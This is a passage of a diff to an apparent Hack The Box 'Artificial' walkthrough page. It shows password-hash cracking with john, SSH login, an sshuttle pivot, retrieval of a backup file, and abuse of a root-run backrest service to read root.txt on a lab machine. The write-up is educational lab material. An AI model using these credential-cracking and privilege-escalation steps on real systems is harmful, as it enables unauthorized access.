+	Using default input encoding: UTF-8
+	Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>Raw-MD5 <span class="o">[</span>MD5 256/256 AVX2 8x3]<span class="o">)</span>
+	Warning: no OpenMP support <span class="k">for </span>this <span class="nb">hash type</span>, consider <span class="nt">--fork</span><span class="o">=</span>12
+	Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+	mattp005numbertwo <span class="o">(</span>?<span class="o">)</span>     
+	1g 0:00:00:00 DONE <span class="o">(</span>2025-07-25 23:34<span class="o">)</span> 2.564g/s 14670Kp/s 14670Kc/s 14670KC/s mattpapa..mattlvsbree
+	Use the <span class="s2">"--show --format=Raw-MD5"</span> options to display all of the cracked passwords reliably
+	Session completed. 
+</code></pre></div></div>
+
+<h4 id="section-cracked-password">Cracked password</h4>
+<ul>
+  <li><strong>User:</strong> gael</li>
+  <li><strong>Password:</strong> mattp005numbertwo</li>
+</ul>
 
 <hr />
-<h1 id="section-tools-used">Tools Used</h1>
+
+<h2 id="section--getting-ssh-access-and-again-starting-user-enumeration">[+] Getting SSH access and again starting user enumeration</h2>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span>  ssh gael@10.10.11.74
+<span class="o">&gt;</span>  
+gael@artificial:~<span class="nv">$ </span><span class="nb">whoami
+</span>gael
+gael@artificial:~<span class="nv">$ </span><span class="nb">cat </span>user.txt
+XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+</code></pre></div></div>
+
+<p>Got user.txt flag now time for root.txt</p>
+
+<hr />
+
+<h2 id="section--privilege-escalation">[*] Privilege Escalation</h2>
+
+<h4 id="section-enumeration-1">Enumeration</h4>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gael@artificial:~<span class="nv">$ </span>netstat <span class="nt">-puntl</span>
+Active Internet connections <span class="o">(</span>only servers<span class="o">)</span>
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
+tcp        0      0 127.0.0.1:5000          0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 127.0.0.1:9898          0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 0.0.0.0:80              0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp        0      0 0.0.0.0:22              0.0.0.0:<span class="k">*</span>               LISTEN      -                   
+tcp6       0      0 :::80                   :::<span class="k">*</span>                    LISTEN      -                   
+tcp6       0      0 :::22                   :::<span class="k">*</span>                    LISTEN      -                   
+udp        0      0 127.0.0.53:53           0.0.0.0:<span class="k">*</span>                           -                   
+</code></pre></div></div>
+
+<p>There is server running on port 9898 and 5000 so its time to pivoting.
+So server is running on localhost so need to do pivot for localhost.
+I am using sshuttle tool:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sshuttle <span class="nt">-r</span> gael@10.10.11.74 127.0.0.1/8                                                                                                                  ─╯
+<span class="o">[</span><span class="nb">local sudo</span><span class="o">]</span> Password: 
+gael@10.10.11.74<span class="s1">'s password: 
+c : Connected to server.
+</span></code></pre></div></div>
+
+<p>Now we can access compromise machine’s servers via our localhost so head down to http://localhost:9898/</p>
+
+<p>After analyze server is running backrest service which is backup utility…</p>
+
+<div align="center">
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Pasted image 20250725234717.png" alt="Backrest backup service interface" width="1000" height="900" class="writeup-img" /></p>
+</div>
+
+<p>Now I try default creds but not worked so again move forward to enumeration process.
+So checked /opt dir and there is where backrest is installed with config files but current user has not permission to read so again i level up enumeration and found backup dir in /var/backups with backrest_backup.tar.gz.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>gael@artificial:~<span class="nv">$ </span><span class="nb">cat </span>config
+<span class="nb">cat</span>: config: No such file or directory
+gael@artificial:~<span class="nv">$ </span>
+gael@artificial:~<span class="nv">$ </span><span class="nb">cat</span> /opt/config
+<span class="nb">cat</span>: /opt/config: Permission denied
+
+gael@artificial:~<span class="nv">$ </span><span class="nb">ls</span> /var/backups
+apt.extended_states.0     apt.extended_states.2.gz  apt.extended_states.4.gz  apt.extended_states.6.gz
+apt.extended_states.1.gz  apt.extended_states.3.gz  apt.extended_states.5.gz  backrest_backup.tar.gz
+</code></pre></div></div>
+
+<p>Download backrest backup file and unzip it to analyze content.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># on compromise machine (victim)</span>
+<span class="o">&gt;</span> python3 <span class="nt">-m</span> http.server 8080
+
+<span class="c"># on host</span>
+<span class="o">&gt;</span> wget http://10.10.11.74:8080/backrest_backup.tar.gz
+
+<span class="c"># unzip it</span>
+<span class="o">&gt;</span> <span class="nb">tar</span> <span class="nt">-xf</span> backrest_backup.tar.gz 
+
+<span class="c"># there is config file in .config dir </span>
+<span class="o">&gt;</span> <span class="nb">cd</span> /backrest/.config/backrest
+<span class="o">&gt;</span> <span class="nb">cat </span>config.json
+ <span class="o">{</span>
+  <span class="s2">"modno"</span>: 2,
+  <span class="s2">"version"</span>: 4,
+  <span class="s2">"instance"</span>: <span class="s2">"Artificial"</span>,
+  <span class="s2">"auth"</span>: <span class="o">{</span>
+    <span class="s2">"disabled"</span>: <span class="nb">false</span>,
+    <span class="s2">"users"</span>: <span class="o">[</span>
+      <span class="o">{</span>
+        <span class="s2">"name"</span>: <span class="s2">"backrest_root"</span>,
+        <span class="s2">"passwordBcrypt"</span>: <span class="s2">"JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"</span>
+      <span class="o">}</span>
+    <span class="o">]</span>
+  <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>Now again hash so need to crack it.
+Its base64 encoded so first decode it and then crack that hash.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&gt;</span> <span class="nb">echo</span> <span class="s2">"JDJhJDEwJGNWR0l5OVZNWFFkMGdNNWdpbkNtamVpMmtaUi9BQ01Na1Nzc3BiUnV0WVA1OEVCWnovMFFP"</span> | <span class="nb">base64</span> <span class="nt">-d</span> | <span class="nb">tee</span> <span class="nt">-a</span> backrest_root_hash.txt
+ <span class="nv">$2a$10$cVGIy9VMXQd0gM5ginCmjei2kZR</span>/ACMMkSsspbRutYP58EBZz/0QO
+
+<span class="c"># hash cracking</span>
+<span class="o">&gt;</span> john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt backrest_root_hash.txt
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>bcrypt <span class="o">[</span>Blowfish 32/64 X3]<span class="o">)</span>
+Cost 1 <span class="o">(</span>iteration count<span class="o">)</span> is 1024 <span class="k">for </span>all loaded hashes
+Will run 12 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+<span class="o">!</span>@#<span class="nv">$%</span>^           <span class="o">(</span>?<span class="o">)</span>     
+1g 0:00:00:15 DONE <span class="o">(</span>2025-07-26 00:14<span class="o">)</span> 0.06653g/s 359.2p/s 359.2c/s 359.2C/s techno..huevos
+Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
+Session completed. 
+</code></pre></div></div>
+
+<p>Now we have backrest user:pass - <code class="language-plaintext highlighter-rouge">backrest_root:!@#$%^</code></p>
+
+<hr />
+
+<h3 id="section-getting-roottxt">Getting root.txt</h3>
+
+<p>Login with cracked credentials.
+Add repo with your choice of password and click submit.</p>
+
+<div align="center">
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Screenshot From 2025-07-26 00-19-21.png" alt="Adding repository to backrest" width="1000" height="900" class="writeup-img" /></p>
+</div>
+
+<p>Here i made repo1 with pass 12345.</p>
+
+<p>Next step would be backing up /root because backrest is running as root so it is capable of backing up root.</p>
+
+<div align="center">
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Screenshot From 2025-07-26 00-20-37.png" alt="Backrest backup interface" width="1000" height="900" class="writeup-img" /></p>
+</div>
+
+<p>Go to repo 1 &gt; run command:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># first make snapshot (backup) of /root</span>
+run <span class="nb">command</span> : backup /root
+</code></pre></div></div>
+
+<div align="center">
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Screenshot From 2025-07-26 00-22-42.png" alt="Creating backup snapshot of root directory" width="1000" height="900" class="writeup-img" /></p>
+</div>
+
+<p>Copy snapshot id and now execute next command to capture root flag.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>dump 304acc04 /root/root.txt <span class="c"># paste your id or latest</span>
+</code></pre></div></div>
+
+<div align="center">
+  <p><img src="/assets/images/writeups/hackthebox/Artificial/Screenshot From 2025-07-26 00-23-23.png" alt="Dumping root flag content" width="1000" height="900" class="writeup-img" /></p>
+</div>
+
+<hr />
+
+<h3 id="section-got-root-flag-enjoy">Got root flag! Enjoy..</h3>
+
+<hr />
+
+<h1 id="section-tools-used">tools used</h1>
 <ul>
   <li>nmap</li>
-  <li>dirsearch</li>
-  <li>burpsuite</li>
-  <li>firefox</li>
-</ul>
-
-<h1 id="section-useful-references">Useful references:</h1>
-<p>CVE-2024-52301</p>
-<ul>
-  <li>https://github.com/Nyamort/CVE-2024-52301</li>
-  <li>https://nvd.nist.gov/vuln/detail/CVE-2024-52301</li>
-  <li>https://github.com/laravel/framework/security/advisories/GHSA-gv7v-rgg6-548h</li>
+  <li>ncat</li>
+  <li>python</li>
+  <li>docker</li>
+  <li>tensorflow</li>
 </ul>
 
 <hr />
 
+<h1 id="section-resources">Resources</h1>
+<ul>
+  <li>https://splint.gitbook.io/cyberblog/security-research/tensorflow-remote-code-execution-with-malicious-model</li>
+  <li>https://github.com/Splinter0/tensorflow-rce</li>
+</ul>
+
+<hr />
 
             </div>
 
             <!-- Navigation Buttons -->
             <div class="mt-8 sm:mt-12 flex flex-col md:flex-row items-center justify-between gap-3 sm:gap-4" data-aos="fade-up" data-aos-duration="600">
                 
+                
+                    
                 
                     
                 
@@ -848,7 +1036,7 @@ e458###########################
                 <!-- Previous Writeup -->
                 
                     
-                    <a href="/writeups/hackthebox/Fluffy-Hackthebox-Walkthrough/" class="nav-button group flex items-center justify-center bg-cyber-green/10 text-cyber-green px-4 sm:px-6 py-2 sm:py-3 rounded-lg hover:bg-cyber-green/20 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 w-full md:w-auto" data-aos="fade-right" data-aos-duration="400">
+                    <a href="/writeups/hackthebox/Environment-Hackthebox-Walkthrough/" class="nav-button group flex items-center justify-center bg-cyber-green/10 text-cyber-green px-4 sm:px-6 py-2 sm:py-3 rounded-lg hover:bg-cyber-green/20 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 w-full md:w-auto" data-aos="fade-right" data-aos-duration="400">
                         <svg xmlns="http://www.w3.org/2000/svg" class="h-4 sm:h-5 w-4 sm:w-5 mr-2 transform transition-transform duration-200 ease-spring group-hover:-translate-x-1" viewBox="0 0 20 20" fill="currentColor">
                             <path fill-rule="evenodd" d="M9.707 16.707a1 1 0 01-1.414 0l-6-6a1 1 0 010-1.414l6-6a1 1 0 011.414 1.414L5.414 9H17a1 1 0 110 2H5.414l4.293 4.293a1 1 0 010 1.414z" clip-rule="evenodd" />
                         </svg>
@@ -863,13 +1051,7 @@ e458###########################
 
                 <!-- Next Writeup -->
                 
-                    
-                    <a href="/writeups/hackthebox/Artificial-Hackthebox-Walkthrough/" class="nav-button group flex items-center justify-center bg-cyber-green/10 text-cyber-green px-4 sm:px-6 py-2 sm:py-3 rounded-lg hover:bg-cyber-green/20 transition-all duration-300 border border-cyber-green/20 hover:border-cyber-green/40 w-full md:w-auto" data-aos="fade-left" data-aos-duration="400">
-                        <span class="font-mono">Next</span>
-                        <svg xmlns="http://www.w3.org/2000/svg" class="h-4 sm:h-5 w-4 sm:w-5 ml-2 transform transition-transform duration-200 ease-spring group-hover:translate-x-1" viewBox="0 0 20 20" fill="currentColor">
-                            <path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd" />
-                        </svg>
-                    </a>
+                    <div class="w-full md:w-auto"></div>
                 
             </div>
         </div>
